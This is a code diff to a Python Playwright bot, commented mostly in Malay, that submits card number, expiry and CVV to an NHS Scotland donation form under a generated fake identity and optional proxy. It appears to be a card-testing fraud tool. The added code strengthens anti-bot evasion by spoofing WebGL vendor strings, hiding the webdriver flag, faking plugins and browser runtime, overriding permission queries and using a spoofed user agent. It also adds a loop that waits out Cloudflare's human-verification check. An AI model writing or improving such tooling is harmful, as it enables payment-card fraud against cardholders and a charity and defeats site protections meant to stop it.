@@ -43,12 +43,25 @@ def bot_log(step, message, emoji=""):
 def print_separator():
     print(f"\n{Colors.CYAN}{'='*15} API BY UNIX DEV TEAM {'='*15}{Colors.RESET}\n")
 
-# FIX: Stealth JS yang lebih kuat untuk bypass Cloudflare Railway
+# FIX: Stealth JS yang paling kuat untuk bypass Cloudflare di Headless Railway
 STEALTH_JS = """
+// WebGL Anti-Fingerprinting
+const getParameter = WebGLRenderingContext.prototype.getParameter;
+WebGLRenderingContext.prototype.getParameter = function(parameter) {
+    if (parameter === 37445) return 'Intel Inc.';
+    if (parameter === 37446) return 'Intel Iris OpenGL Engine';
+    return getParameter.call(this, parameter);
+};
+
+// Hilangkan tanda WebDriver
 Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
 Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
 Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
+
+// Tambah Chrome Runtime
 window.chrome = { runtime: {} };
+
+// Permissions Bypass
 const originalQuery = window.navigator.permissions.query;
 window.navigator.permissions.query = (parameters) =>
     parameters.name === 'notifications'
@@ -88,9 +101,8 @@ async def process_nhscot_donation(cc, mm, yy, cvv, proxy_str=None):
     bot_log("INIT", f"Generated Identity: {fake_id['first_name']} {fake_id['last_name']}", "[👤]")
     
     async with async_playwright() as p:
-        # Railway memerlukan headless: True
-        launch_args = {"headless": True}
-        context_args = {"ignore_https_errors": True}
+        launch_args = {"headless": True, "args": ["--no-sandbox", "--disable-setuid-sandbox"]}
+        context_args = {"ignore_https_errors": True, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"}
         
         if proxy_str:
             try:
@@ -110,8 +122,6 @@ async def process_nhscot_donation(cc, mm, yy, cvv, proxy_str=None):
 
         browser = await p.chromium.launch(**launch_args)
         context = await browser.new_context(**context_args)
-        
-        # Inject Stealth JS
         await context.add_init_script(STEALTH_JS)
         
         page = await context.new_page()
@@ -122,14 +132,29 @@ async def process_nhscot_donation(cc, mm, yy, cvv, proxy_str=None):
         bot_log("INIT", f"Target -> {target_url}", "")
 
         try:
-            # PERINGKAT 1: Pergi ke halaman donasi
+            # PERINGKAT 1: Pergi ke halaman donasi & Bypass Cloudflare
             bot_log("POST", "Step 1: Navigating to Donation Form...", "[🚀]")
             try:
-                # FIX: Guna 'commit' supaya tak crash bila Cloudflare tunjuk page "Checking browser"
                 await page.goto(target_url, timeout=60000, wait_until="commit")
             except Exception as e:
                 bot_log("WAIT", "Cloudflare security check detected. Waiting...", "[🛡️]")
-                await asyncio.sleep(10) # Tunggu Cloudflare selesai check
+                await asyncio.sleep(10)
+            
+            # FIX: Tunggu Cloudflare habis check (Maksima 60s)
+            bot_log("WAIT", "Waiting for Cloudflare to clear...", "[⏳]")
+            for i in range(60):
+                try:
+                    page_title = await page.title()
+                    page_content = await page.content()
+                    
+                    # Kalau page masih loading Cloudflare
+                    if "just a moment" in page_title.lower() or "checking your browser" in page_content.lower() or "verify you are human" in page_content.lower():
+                        await asyncio.sleep(2) # Tunggu 2 saat dan check lagi
+                    else:
+                        bot_log("SCAN", "Cloudflare Passed!", "[✅]")
+                        break
+                except:
+                    await asyncio.sleep(2)
             
             # Tunggu borang Gravity Forms load
             bot_log("WAIT", "Waiting for Form to render...", "[⏳]")
